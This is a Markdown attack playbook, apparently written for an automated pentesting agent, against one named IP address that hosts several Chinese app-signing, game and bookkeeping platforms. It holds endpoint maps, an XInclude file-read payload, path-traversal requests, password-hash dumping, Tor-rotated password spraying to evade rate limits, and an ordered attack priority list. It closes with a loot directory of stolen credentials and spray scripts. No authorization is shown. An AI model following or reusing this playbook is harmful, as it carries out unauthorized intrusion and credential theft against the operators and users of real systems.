# 超级猫 + 西风 + 百胜 + TG记账同机 (154.12.30.132 · 2026-10-01/02)

## Topology
- Entry: `http://154.12.30.132:8080/#/` → **TG 记账** Vue/Vite SPA
- Same IP `154.12.30.132`:
  - 80/443 Host `ff.xingliyouxi.top` → **超级猫超级签名** ThinkCMF / ThinkPHP **V5.0.11** / PHP **7.1.33**
  - 443 Host `xingliyouxi.top` / `xlyx.xingliyouxi.top` → **百胜游戏 BestGame** Next/Vite CMS
  - 8443 → **西风分发** ThinkPHP enterprise sign
  - 22 OpenSSH 7.4 (password+pubkey)
- DNS: apex → same A; NS `myhostadmin.net`
- Open ports (typical): 22, 80, 443, 8080, 8443 — MySQL/Redis/BT often filtered

## SuperCat admin
- `/admin` title: 超级猫超级签名 后台管理中心
- POST `/admin/public/dologin.html`: `username`, `password`, `captcha`, `redirect`
- Captcha: `/captcha/new.html?height=32&width=150&font_size=18`
- **IP+Host** → always `非法登录!`
- **Canonical HTTPS domain** → wrong pass = `密码错误！` (admin exists)
- User mobiles **cannot** admin-login (`用户名不存在`) — separate admin table
- Tor themed spray (~30) missed → stop; captcha OCR noise high

## SuperCat user foothold
- Register mobile tab: no SMS; `POST /user/register/doregister.html`
- Login `/user/login/dologin.html`; **don't crawl logout**
- **`POST /user/index/islogin.html`** → `data.user` includes **`user_pass`** `###`+32hex — dump hashes early
- `passwordpost` (`/user/profile/passwordpost.html`): requires `old_password`; **`id` param ignored** (only self) — false IDOR
- mass-assign `user_type`/`coin`/`downloads` via editpost → no effect

### Apps / IPA
- Upload: `POST /portal/index/upload_ipa.html` multipart → `{code:1,id,"应用已保存…"}` + short `er_logo`
- Edit own: multipart `POST /user/tube/upd.html` (urlencoded alone → System Error)
- Download own: `POST /user/tube/downfile.html` `{id}` → zip/IPA
- Public install page: `GET /<short>` embeds `app_id`
- `POST /portal/posted/download_link` `{appid,url}` → signed short URL with query token (does **not** fetch arbitrary URL body)
- Empty shells: `bundle=kongbao`, title placeholder — may list for all users; **del success on shells ≠ cross-tenant**
- Second-user test (required before IDOR claim):
  - Other user's real app: editor may open empty template; **del/upd/downfile blocked**
  - Own new upload id works only for owner

### IPA Info.plist XML (unconventional)
- **Blocked:** `DOCTYPE` / external `ENTITY` → `code:2` `应用描述包含不允许的 XML 实体`
- **Filter bypass, no proven expand:** XInclude
  ```xml
  <plist xmlns:xi="http://www.w3.org/2001/XInclude">…
  <string><xi:include parse="text" href="file:///etc/passwd"/></string>
  ```
  → often `code:1` + new id, but editor `name` empty and public title blank — **not** LFI until content appears in name/details/parsed fields.
- UTF-16 LE + ENTITY: still no reliable echo in this deploy.

### Upload / UEditor / fake RCE
- `/user/asset/webuploader.html`, `/user/Ueditor/upload.html?action=uploadimage|uploadfile|config`
- **Always** `GET …?action=config` first — full allowlists/pathFormats/catcherLocalDomain
- gif/jpg OK; PHP-in-GIF → `/upload/YYYYMMDD/<md5>.gif` **source readable**, nginx **does not execute**
- `uploadfile` allows `.txt` `.zip` `.pdf` office — **login required**; public GET of `/upload/…/x.txt`
- Rejected: `.php`, `.htaccess`, `.user.ini`, `web.config`, `a.txt.php`
- Zip slip: SUCCESS upload, **no server-side extract** (traversal stays inside zip bytes)
- `catchimage` (`source[]`): often System Error / `非法上传` even for baidu; `catcherLocalDomain: [127.0.0.1,localhost,img.baidu.com]` acts as **skip-local**. Decimal/hex/`127.1`/`[::1]` bypasses still failed here — only retry DNS-rebind if a **normal remote image** ever catches successfully first
- icon/`img` on upd: can store `http://127.0.0.1/…` or `file:///…` with `修改成功` but UI stays `/nologo.png` unless client file input — **DB-only fake SSRF**

### TP5.0.11
- Error body: `ThinkPHP V5.0.11` / `页面错误！请稍后再试～`
- Classic `s=index/\think\app/invokefunction...` and captcha `_method=__construct` → 404/System Error on ff; 8443 generic template — **don't loop encyclopedia payloads** after first clean miss

## 西风 :8443
- Bare `/` → `访问地址不正确！` (len~24) or short-code miss → `该应用不存在或已下架`
- `GET /composer.json` or **`/static/../composer.json`**: think-orm, aliyuncs OSS, qiniu, **yunchuang/appstore-connect-api**, workerman, phpmailer
- **Traversal readable:** `/static/../composer.json`, `/static/../static/app/app.mobileprovision` (also `..%2f`)
- **403 present (not 404):** `.env`, `data/conf/database.php`, `.git/HEAD|config`, `static/app/*.p12`, `key.pem`, `runtime/log/…`, nginx access/error logs
- Suffix bypass (`.p12.jpg`, `.env.txt`) → 200 **error HTML**, not secrets
- Host=localhost / OPTIONS/PUT/PROPFIND on p12 path still 403
- Workerman-ish ports (2345/7272/8282/8000–8010) closed on this sample IP
- mobileprovision sample: enterprise Capinfo / Team `Z33AYFK3S6`, ProvisionsAllDevices (may be expired)
- Need correct distribute Host + app short-code for clientapi/inhouse chain (parent skill §分发链)

### Admin (HelloAdmin / XinAdmin / 西风分发)
- `GET /admin/login` — title 西风分发; avatar `/xinadmin/login/images/admin.jpg`; **no captcha**
- Fields: **`adminname`**, **`adminpassword`**
- **Working login POST:** `/admin/login/login` (path)
  - Wrong: `{"status":"no","msg":"登录信息有误或帐号未激活"}` (wrong pass **or** inactive — one msg)
  - Right: `status=="ok"` (inline `CheckLogin` in login HTML)
- **Trap:** `POST /admin/login?a=login` returns **login HTML shell** (~18677) — not JSON; do not treat as success
- `/index.php/admin/login/login` on this sample → error template; prefer `/admin/login/login`
- Unauth `/admin/config|/index|/app|/user` → 「尚未登陆！」+ jump `/index.php/admin/...` (not datasource leak; 13k can still be shell)
- XinAdmin lore default `admin/123456` **missed** here; themed spray (admin/xifeng/xuanfeng/xinadmin/HelloAdmin/pear/apple + common) all `no`; **no captcha / no lock** — background deep dict only after themed miss
- SQLi usernames → same `no`
- SSH 22 password auth open; SuperCat user / 西风 admin / root **not** the same pool on this host

### XinAdmin static unauth (pull BEFORE login spray)
| Path | Result |
|------|--------|
| `/xinadmin/adminuser/config/pear.config.yml` + `.json` | 200 Pear config |
| **`/xinadmin/adminuser/admin/data/menu.json`** | **200 full admin menu tree** |
| `/xinadmin/adminuser/admin/data/message.json` | present if shipped |
| `/xinadmin/adminuser/component/pear/...` | Pear chrome |

**menu.json modules (inventory):** `?c=key` 企业密钥 · `?c=cert` · `?c=super_cert` · 超级签授权码/设备/记录 · `file_code` · `?c=admin` · 用户/充值/提现 · `?c=clear`

**Business `?c=` unauth:** `GET ?c=key|cert|super_cert|file_code|admin|user|clear` (and `/index.php/admin/?c=`) → **~11344 西风 error HTML**, not JSON data — need session. Report as **surface map**, not IDOR.
- `install.lock` → **403 present** (on disk)
- **Root gate:** admin password (certs/keys) or 8443 `.env`/p12 nginx-403 bypass; user foothold + menu leak ≠ shell/root

### wave.js install surface (DAFU / Xuanfeng)
Error-page assets: `/static/index/js/template/wave.js`, markup.js, ua-parser
- `DAFU.brand="Xuanfeng"`; server: `/index/ajax/jsonFormat?lang=&link=` (+ optional `ssid`, `module=s`)
- Unknown `link` → `code:200` + `template:"error"` (~9991 bytes) — SuperCat short codes do **not** work as 西风 links
- `/index/super_sign/dosign` POST appid/ssid/authcode → `PLATFORM_NOT_MATCHING` without real app + iPhone UA
- `/index/super_sign/check_sign` → often `code:2,data:2`
- Other: `/index/guide?lang=zh`, `/index/ajax/adsense?template=tmp1`, `/index/ajax/report`

### SuperCat webuploader
- Auth page `/user/asset/webuploader.html`
- Upload server: **`/user/asset/webuploader.html?_ajax=1`**
- `httpUrl = https://ff…/upload/` local; success JSON `filepath` / `preview_url` / `url` under `/upload/YYYYMMDD/`
- php rejected; gif+php source leak only

## 百胜 BestGame CMS (same apex)
- Title `百胜游戏 BestGame`; showcase TG: `t.me/xinglibuyu`, `t.me/xingli888`; ops `HDKJ2014`/`xinglang2016`
- `/admin` → 307 `/admin/login`
- `POST /api/admin-login` application/x-www-form-urlencoded `username`+`password`
  - Fail: **303** `Location: .../admin/login?error=1` (no cookie)
  - Success: 303 to `/admin` + **`bestgame_admin=`** cookie (HttpOnly; Secure; SameSite=Strict; cleared on logout)
- `/api/content` GET/POST JSON `{content,revision,publish}` — unauth 401; revision optimistic lock
- `/api/upload` POST — 401 unauth; `/api/admin-password` JSON change password
- Weak cookie values (admin/md5/hmac site-name) all still 401 — sealing not trivial
- Main JS route table lists all `/api/admin-*` without login

## TG 记账 :8080
- SPA `assets/index-*.js`; axios `baseURL:"/api"`
- `POST /api/auth/login` `{username,password}` → token; `Authorization: Bearer`
- `GET /api/me`, `/api/groups`, `/api/plans`, `/api/users` (super), `/api/audit-logs`, `/api/system-logs`, `/api/rates/live/usdt`, group txn/fees/export
- `/api/health` 200 unauth; rest 401
- No `/api/auth/register`; **RATE_LIMITED** per IP — Tor NEWNYM, ≤4 tries/exit
- Headers may include `x-ratelimit-limit` (e.g. 10) + helmet-style CSP/HSTS
- JWT none + common secrets failed in session — map first
- **Null byte:** JSON username with `\u0000` / raw 0x00 → **500 INTERNAL**, message only `服务器内部错误`, **no stack** — fingerprint only; mass-assign `isSuperAdmin`/`role` on body ignored

## Attack priority (this co-host class)
1. Same-IP full port + Host vhost map (ff / xlyx / 8443)
2. SuperCat **register → islogin hash → IPA upload** (minutes)
3. 8443 **static traversal** for composer + provision; note 403 secret inventory
4. BestGame admin-login signature + content API map
5. 8080 API map + Tor-limited login (not origin spray)
6. Unconventional after foothold: UEditor config+txt/zip write; IPA XInclude only if echo proven; 8080 null-byte fingerprint; skip blocked TP5 loops
7. Admin passwords / p12 403 bypass / DNS-rebind catch / true 8443 Host+shortcode — only after foothold delivered

## Pitfalls
- Reporting shell-del or passwordpost `id=` as confirmed cross-user IDOR without second account
- Calling GIF+PHP upload RCE when nginx serves image/*
- Calling XInclude upload a file-read when name/public page empty
- Calling icon=`file://` SSRF without local `/upload` copy proof
- Burning SuperCat admin spray on IP+Host (always 非法登录)
- Hitting logout mid-recon
- Looping TP5 invokefunction after V5.0.11 fingerprint already showed clean block
- 8443 `.p12.jpg` 200 ≠ file read
- Skipping UEditor `action=config` then guessing catchimage is dead

## Loot pointer
`/root/154.12.30.132_pentest/` — USER_CREDS, islogin JSON, provision, trav_* composer/provision, ueditor_config.json, FINAL_PENTEST_REPORT.md (§8 unconventional), scripts/8443_trav.py / tor_admin_spray.py
